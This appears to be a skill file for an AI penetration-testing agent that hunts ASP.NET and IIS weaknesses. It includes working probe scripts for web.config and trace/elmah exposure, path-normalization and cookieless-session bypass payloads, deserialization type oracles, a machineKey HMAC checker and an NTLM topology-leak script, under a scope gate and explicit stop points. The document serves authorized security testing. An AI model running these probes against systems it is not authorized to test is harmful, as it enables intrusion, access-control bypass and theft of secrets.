---
name: zp-aspnet
description: ZeroProtocol hunter for ASP.NET and IIS surface - ViewState signed-only versus encrypted and what a leaked machineKey actually proves, BinaryFormatter and Json.NET type-resolution oracles, trace.axd, elmah.axd and web.config exposure, IIS 8.3 short-name enumeration, request filtering versus path normalization, Razor handlers, Blazor _framework assemblies, and anonymous NTLM topology leaks from a 401. Use when Microsoft-IIS, X-AspNet-Version, .ASPXAUTH or __VIEWSTATE appears.
---

# zp-aspnet - the hidden field is a serialized object

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0 before any request.
Exit 1 refuse and name the pattern · 3 stop · 4 stop.

Classic ASP.NET ships a **deserializer reachable from an unauthenticated form post**, and the only thing between it
and code execution is one symmetric key in `web.config`. Everything here is either a way that key escapes or a way
IIS answers a request the app never meant to route. The bar is never `__VIEWSTATE` existing - it is the **leaked key
proven against the server's own bytes**, the named secret, the resolved type id, or the source that leaked.

---

## Procedure

**1. Fingerprint the generation.** Framework 4.x has ViewState, `.axd` handlers and the request validator; .NET
Core / 5-10 has none of them, so on an IIS host with a `.AspNetCore.*` cookie and no `X-AspNet-Version`, skip step 3.

```bash
H=target.tld
curl -skI "https://$H/" | grep -iE '^server:|x-aspnet|x-powered-by|^set-cookie:.*(ASP\.NET_SessionId|ASPXAUTH|AspNetCore|FedAuth)'
curl -sk "https://$H/" | tee /tmp/zp.aspx | grep -oE 'id="__VIEWSTATE(GENERATOR|ENCRYPTED)?" value="[^"]{0,24}'
curl -sk "https://$H/zp-$RANDOM.aspx" | grep -oiE "Server Error in '[^']*' Application|\.NET Framework Version:[0-9.]+|HTTPAPI/2\.0" | sort -u
```

`X-AspNet-Version` is Low alone. An `HTTPAPI/2.0` 404 is http.sys with no matching host binding - read the certificate SANs and give the names to `zp-recon-passive`.

**2. The `.axd` and config zoo** - single requests, outsized payoff. Do these before anything clever.

```bash
for p in /trace.axd /elmah.axd /elmah.axd/download /glimpse.axd /ChartImg.axd /Telerik.Web.UI.WebResource.axd /bin/ \
         /web.config /web.config.bak /web.config.txt '/web.config::$DATA' '/web.config.' '/web.config%20' /Views/web.config \
         /bin/web.config /global.asax /App_Data/ /appsettings.json /_framework/blazor.boot.json; do
  printf '%-42s %s\n' "$p" "$(curl -sk -o /dev/null -w '%{http_code} %{size_download} %{content_type}' --path-as-is --max-time 20 "https://$H$p")"; done
```

Calibrate against a path you invented - IIS answers `200` with a friendly error page constantly, so **size and
content-type decide, never the status code**. A `403` on `trace.axd` is normally a kill: `<trace localOnly="true">`
is decided by `HttpRequest.IsLocal`, i.e. the socket peer, and classic ASP.NET never consults
`X-Forwarded-For` for it. The header only ever flips the handler where an upstream (ARR, a custom
module) rewrites `REMOTE_ADDR`, or where the app reads XFF into an authorization check of its own. `elmah.axd/download` streams the *whole* log as CSV - first line, then stop.

**3. ViewState posture, then prove any recovered `machineKey` offline.** `__VIEWSTATE` decoding to `ff01` is a plaintext
`ObjectStateFormatter` stream, and `__VIEWSTATEENCRYPTED` is rendered **only when ViewState is encrypted**, and its value is
always empty - so the field's **presence** means encrypted (needs `decryptionKey` as well as
`validationKey`), and its **absence** means MAC-only, where `validationKey` alone forges it.
Reading the empty value as "signed only" inverts the test and sends you after the wrong key. Keys leak from a served
`web.config`, `elmah.axd`, or a repo or vendor DLL (`zp-code-audit`, `zp-js-secrets`); recompute the MAC over the ViewState **the server itself issued** - zero extra requests, unambiguous.
Take the generator from **that page**. It is per-page and per-application, so a value copied from a
write-up feeds the wrong modifier into every HMAC and the script reports "wrong key" over a key that is
in fact live - the one way this check produces a false kill on a Critical. Where the field is absent the
`none` row below is the real answer.

```bash
VS=$(grep -oP '(?<=__VIEWSTATE" value=")[^"]*' /tmp/zp.aspx)
VSG=$(grep -oP '(?<=__VIEWSTATEGENERATOR" value=")[^"]*' /tmp/zp.aspx); VSG=${VSG:-00000000}
VK='PASTE_VALIDATIONKEY_HEX'
python3 - "$VS" "$VSG" "$VK" <<'PY'
import base64, binascii, hmac, hashlib, sys
vs = base64.b64decode(sys.argv[1]); mod = binascii.unhexlify(sys.argv[2]); key = binascii.unhexlify(sys.argv[3])
print("header", vs[:2].hex(), "(ff01 = plaintext)")
for alg, n in (("sha1", 20), ("sha256", 32), ("sha384", 48), ("sha512", 64)):
    for label, m in (("le", mod[::-1]), ("be", mod), ("none", b"")):
        if hmac.compare_digest(hmac.new(key, vs[:-n] + m, getattr(hashlib, alg)).digest(), vs[-n:]):
            sys.exit(f"machineKey CONFIRMED  alg={alg} modifier={label}")
print("no match - wrong key, or a 4.5+ purpose-derived MAC rather than 4.0 compatibility mode")
PY
```

A match is the finding: **you hold the signing key for an unencrypted deserializer.** Stop. A
`ysoserial.net -p ViewState` gadget, or `viewgen` in forge mode, is RCE in `w3wp.exe` - `zp-rce-ssti`, with written
permission. `badsecrets` (`pip install badsecrets`; `badsecrets --url https://$H/`) tests a ViewState against ~2,500 publicly-known keys read-only and is the one tool worth running here.

**4. Serialization oracles - resolve a type, do not load a gadget.** State hides in cookies, redirect parameters,
`__EVENTARGUMENT`, ASMX/WCF bodies and Web API JSON.

```bash
curl -sk -D - "https://$H/" -o /dev/null | grep -oE 'AAEAAAD/////|/wE[A-Za-z0-9+/]'   # BinaryFormatter / LosFormatter prefixes
for b in '{"$type":"Zp.NoSuchType, Zp"}' '{"__type":"Zp.NoSuchType"}'; do
  curl -sk -X POST "https://$H/api/item" -H 'Content-Type: application/json' --data-binary "$b" \
   | grep -oiE "Error resolving type specified in JSON|Could not create an instance of type|could not load type '[^']*'" | head -1; done
curl -sk "https://$H/Service.asmx?WSDL" | head -c 300; curl -sk -o /dev/null -w ' mex=%{http_code}\n' "https://$H/Service.svc/mex"
```

`AAEAAAD/////` is `BinaryFormatter` in base64 - wherever it sits in a client-settable value, an attacker's object graph reaches `Deserialize()`. An error naming your invented type proves `TypeNameHandling` is not `None`, or that `__type` drives a `DataContractJsonSerializer`. Those messages are the whole report.

**5. IIS path surface - short names, then filtering versus normalization.** 8.3 enumeration leaks the first six
characters of names the site never linked; `hiddenSegments` (`bin`, `App_Data`, `App_Code`, `web.config`) and every
`<location path=…>` rule are string checks run at a different stage from the canonicalization that resolves the file.

```bash
R=/admin/Users.aspx
shortscan "https://$H/" 2>/dev/null || set -- '/*~1*/.aspx' '/zzzzzz*~1*/.aspx' '/*~1*/a.aspx'
for v in "$@" "$R" '/admin::$INDEX_ALLOCATION/Users.aspx' "/(S(zp$RANDOM))$R" "/(A(zp))(S(zp))$R" "/./admin/Users.aspx" \
         "//admin/Users.aspx" "/admin%2fUsers.aspx" "/%2e%2e/admin/Users.aspx" "$R." "$R%20" "/Admin/USERS.ASPX"; do
  printf '%-44s %s\n' "$v" "$(curl -sk -o /dev/null -w '%{http_code} %{size_download}' --path-as-is --max-time 20 "https://$H$v")"; done
curl -sk -o /dev/null -w 'xou=%{http_code}\n' "https://$H/" -H "X-Original-URL: $R"
```

`--path-as-is` is mandatory - without it curl collapses the payload locally and you test nothing. A matching wildcard
gives **404** and a non-matching one **400**; you need *both* before believing either. `/(S(...))/` and `/(A(...))/` are
ASP.NET **cookieless session and anonymous-id** markers, stripped by the runtime before routing and honoured by neither
the WAF, the proxy nor `<location>` - a `200` at the authenticated page's size where the canonical path gives `401`/`403` is bypass for `zp-authz`, and an edge-versus-origin split is `zp-semantic-confusion`.

**6. Razor, Razor Pages and Blazor.**

```bash
curl -sk -o /dev/null -w 'cshtml=%{http_code}\n' "https://$H/Views/Home/Index.cshtml"   # served as text = template source
for hd in Delete Approve Export; do printf '%-8s %s\n' "$hd" "$(curl -sk -o /dev/null -w '%{http_code}' "https://$H/Account/Manage?handler=$hd")"; done
curl -sk "https://$H/_framework/blazor.boot.json" | grep -oE '"[A-Za-z0-9._-]+\.(dll|wasm|pdb)"' | head -20
curl -sk -o /dev/null -w 'hub=%{http_code}\n' -X POST "https://$H/_blazor/negotiate?negotiateVersion=1"
```

A served `.cshtml` is template source disclosure. `?handler=` reaches a **named handler method** on a Razor Page - if
`OnPostDelete` carries no check of its own, that is the bypass. A readable `blazor.boot.json` means every assembly and
any `.pdb` is downloadable and decompilable with ILSpy - treat it as `zp-js-secrets` treats a webpack map; Blazor **WebAssembly** enforces nothing client-side, and Blazor **Server** runs components over `/_blazor` (`zp-websocket`).

**7. Windows auth and NTLM topology from a 401.** One anonymous Type-1 message returns the AD names, but keep-alive
is required - a one-shot `curl` only proves NTLM is *offered*.

```bash
for p in / /owa /ews/exchange.asmx /_vti_bin/lists.asmx /autodiscover/autodiscover.xml; do
  printf '%-30s %s\n' "$p" "$(curl -skI --max-time 20 "https://$H$p" | grep -i '^www-authenticate' | tr -d '\r' | tr '\n' ' ')"; done
python3 - "$H" /_vti_bin/lists.asmx <<'PY'
import base64, re, socket, ssl, struct, sys
h, path = sys.argv[1], sys.argv[2]
s = ssl._create_unverified_context().wrap_socket(socket.create_connection((h, 443), 15), server_hostname=h)
s.sendall(f"GET {path} HTTP/1.1\r\nHost: {h}\r\nConnection: keep-alive\r\nAuthorization: NTLM "
          "TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==\r\n\r\n".encode())
d = b""
while b"\r\n\r\n" not in d and (x := s.recv(8192)): d += x
m = re.search(rb"WWW-Authenticate:\s*NTLM\s+([A-Za-z0-9+/=]{24,})", d, re.I) or sys.exit("no Type-2 challenge")
b = base64.b64decode(m.group(1)); assert b[:8] == b"NTLMSSP\x00"          # AvId 1 NetBIOS host, 2 NetBIOS domain, 4 DNS domain, 5 forest root
ln, _, off = struct.unpack_from("<HHI", b, 40); ti = b[off:off + ln]; i = 0
while i < len(ti) and struct.unpack_from("<H", ti, i)[0]:
    aid, al = struct.unpack_from("<HH", ti, i)
    print(f"  AV[{aid}] {ti[i+4:i+4+al].decode('utf-16-le','ignore')}"); i += 4 + al
PY
```

What pays is the **forest root** - one that is a corporate parent of the tested brand proves this "isolated" host is a
child domain inside production AD, and a `WIN-XXXXXXXXXXX` name proves provisioning was never finished. `zp-redteam-ad`.

**8. Stop point for this class.** The served config or source file, the `elmah.axd` first row, the offline MAC match, the
resolved type id, the enumerated short names, the bypassed status code, the AV-pair names. You do **not** forge a
ViewState, write an `.aspx` or any webshell, upload through a Telerik `RadAsyncUpload` handler, use a key or credential you found, request `SAM`/`SYSTEM` through a traversal, or send NTLM credentials - each is exploitation on a live host.

---

## Probes and payloads

| Probe | Targets | Positive looks like |
|---|---|---|
| `/trace.axd`, `/elmah.axd`, `/glimpse.axd`, then with `X-Forwarded-For: 127.0.0.1` | request and error-log viewers | a request table holding another user's `Cookie`/`Authorization`, or an exception list |
| `/web.config` plus `.bak`, `.txt`, trailing `.`/`%20`, `::$DATA`, `/Views/`, `/bin/` | `hiddenSegments` and handler-mapping gaps | XML containing `<machineKey`, `connectionString` or an API key |
| `__VIEWSTATEENCRYPTED=""` decoding to `ff01`, then an offline HMAC with a leaked `validationKey` | crypto posture, then key validity | a plaintext `ObjectStateFormatter` stream, then `machineKey CONFIRMED` with no request sent |
| `POST __VIEWSTATE=AAAA`, then `__VIEWSTATE=<xss/>`, with the real `__VIEWSTATEGENERATOR` | error-path fingerprint, then the second parser | `Validation of viewstate MAC failed` (+ the web-farm sentence = unsynced keys across nodes), then `The state information is invalid for this page and might be corrupted` |
| `{"$type":"Zp.NoSuchType, Zp"}`, `{"__type":"Zp.NoSuchType"}`, or `AAEAAAD/////`/`/wE` inside a cookie | Json.NET and DataContract type handling, `BinaryFormatter` sink | `Error resolving type specified in JSON`, `Could not load type`; or the prefix itself in an attacker-controllable value |
| `/*~1*/.aspx` vs `/zzzzzz*~1*/.aspx` (`--path-as-is`) | IIS 8.3 names | **404** on the match, **400** on the miss - both required |
| `/(S(x))/admin/…`, `/admin::$INDEX_ALLOCATION/…`, `/admin%2f…` | filter versus normalization | `200` plus authenticated body size where the canonical path is `403` |
| `?handler=Delete`, `GET /Views/**/*.cshtml`, `/_framework/blazor.boot.json`, `/Service.svc/mex` | handler binding, template source, WASM bundle, WCF metadata | the handler runs unauthenticated; `.cshtml` as text; an assembly and `.pdb` manifest; a full service contract |
| `Authorization: NTLM TlRMTVNTUAABAAAA…` over keep-alive | MS-NLMP AV_PAIRS | `DNS forest root`, `NetBIOS domain`, `WIN-XXXXXXXXXXX` |
| `ScriptResource.axd?d=<flipped bytes>` | MS10-070 padding oracle | a `500`/`404` split by ciphertext - patched since 2010, expect nothing |
| optional tooling, none of it required | the loops above, faster | `shortscan`, `badsecrets`, `nuclei -t http/exposures/configs/ -rate-limit "$(zp-scope show --json \| jq -r '.rate_limit_rps // 5')"` - otherwise `curl`, `python3` and `openssl s_client` cover every row |

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| `web.config` served with `<machineKey validationKey=…>` or a connection string | **confirmed. Critical.** Name the keys, never use them |
| leaked `validationKey` verified offline, `__VIEWSTATEENCRYPTED` empty | **confirmed pre-auth RCE primitive. Critical.** The offline match is the proof; the gadget is not yours to fire |
| `trace.axd` returning live requests with another user's `Cookie` or token, or `elmah.axd` with a connection string in an exception | **confirmed. High to Critical** - session theft plus PII, graded by what the dump actually holds. One screenshot, then stop |
| the app resolves an attacker-supplied .NET type id | **confirmed unsafe deserialization. High to Critical** pending a reachable gadget - `zp-rce-ssti` |
| `/(S(x))/` or `::$INDEX_ALLOCATION` reaching a page the canonical path refuses, or `?handler=` invoking a state-changing handler | **confirmed authorization bypass / BFLA. High**, and it outranks any disclosure on the same host - `zp-authz` |
| `__VIEWSTATEENCRYPTED` empty and **no** key recovered | **primitive only. Low to Medium** - a hardening finding, not RCE. This is the line most reports in this class cross |
| `Validation of viewstate MAC failed` plus the web-farm sentence | unsynced `machineKey` across nodes - topology disclosure, **Low**, and an availability bug for real users |
| the two-parser differential alone, or `X-AspNet-Version` and a version banner in a 500 | **not findings** - the differential is a note in the report body, and the banners are Informational and the most-duplicated ASP.NET report there is. Check `zp-intel` |
| short names that all resolve to linked public files, a uniform `404`/`400` across both wildcards, `403` on the `.axd` viewers, or a padding-oracle split | **killed** - the name leak counts only for an unlinked file and only once you see the split; the `.axd` viewers are gated on the socket peer, and `X-Forwarded-For` reaches them only through an upstream that rewrites `REMOTE_ADDR`; MS10-070 has been patched 15 years, so reproduce twice or drop it |
| `WWW-Authenticate: NTLM` with no AV_PAIR beyond the host you already had | **Informational** - the challenge is RFC behaviour. Only a forest root or a default hostname earns Low-Medium |
| any of the above on a host `zp-scope check` did not allow | **not yours.** Stop and re-run the gate |

---

## High-value patterns

- **`web.config` served from a subdirectory** - `/Views/web.config`, `/bin/web.config`, a `.bak` left by a deploy: the root is hardened and one forgotten copy holds `<machineKey>`. A `machineKey` in a public repo or vendor DLL matching a live site is the same chain from the other end, found by `zp-recon-passive` and `zp-code-audit` and proven by step 3 without a packet.
- **`trace.axd` on a staging or acquisition host** from passive recon - it buffers real users' requests, headers included, which outranks any config leak.
- **`/(S(...))/` cookieless session segments** in front of an admin path - stripped by the runtime, honoured by nothing else, barely hunted; Razor Pages `?handler=` is the same bug one framework later, and Blazor WebAssembly's `_framework` with `.pdb` files hands over every internal API route from one GET.
- **A `.svc` or `.asmx` admin service** beside a modern front end - looser auth, `DataContractSerializer` bodies, untouched since 2014. Inventory to `zp-api`; a live `Telerik.Web.UI.WebResource.axd` is the same shape and becomes a version-to-CVE lead for `zp-cve`, never an upload.
- **NTLM on a public binding revealing a corporate forest root** - proves an "isolated" environment is a child domain in production AD.

---

## Pitfalls

- **Filing "unencrypted ViewState" as Critical with no key** - the primitive is real, the impact is not - or **forging one "just to confirm"**, which is code execution under the app-pool identity, and `ysoserial.net` gadgets are not reversible. `badsecrets` read-only, or offline HMAC.
- **Downloading `elmah.axd/download` or mining a trace dump** - bulk exfiltration of other users' sessions. One row, one screenshot.
- **Omitting `--path-as-is`** in steps 2 and 5 - curl normalizes the payload away and you record false negatives all afternoon - or trusting status codes at all: IIS answers `200` with an error page and `404` with a valid path.
- **Using a key, connection string or credential you found.** Name and location only - connecting to that database is unauthorized access however the web app is scoped.
- **Writing an `.aspx` anywhere**, uploading through a Telerik handler, reaching for a Potato exploit, or requesting `System32\config\SAM` through a traversal you already proved with `web.config` - all post-exploitation, out of scope everywhere.
- **Treating a SharePoint or Exchange host as the web app** - separate products, separate scope rules, far larger blast radius. Confirm those explicitly, and keep the short-name and path loops inside the rate limit `zp-recon-active` recorded.

---

## Hand off to

New host, forest name or vhost -> `zp-scope` first; naming -> `zp-recon-passive`, `zp-recon-active`. Unfound `.axd`,
`.svc`, `.asmx` and backup config -> `zp-content-discovery`; recovered source and leaked keys -> `zp-code-audit`,
`zp-js-secrets`. ViewState, `BinaryFormatter` and type-id escalation -> `zp-rce-ssti`; Telerik, Sitecore, DNN and
Umbraco versions -> `zp-cve`. Leak framing -> `zp-info-disclosure`. Path and filter bypass -> `zp-authz`,
`zp-semantic-confusion`, `zp-smuggling`, `zp-cache-poison`. `.ASPXAUTH` and `FedAuth` -> `zp-session`, `zp-jwt-oauth`.
Validator gaps reaching the DOM -> `zp-xss`; traversal and XML entities -> `zp-xxe-lfi`; injection in a
connection-backed parameter -> `zp-sqli`. Uploads -> `zp-upload`. Blazor Server `/_blazor` -> `zp-websocket`. AD and
Entra topology -> `zp-redteam-ad`, `zp-redteam-entra`. Dedup -> `zp-intel`. Confirmed -> `zp-triage`, `zp-report`.
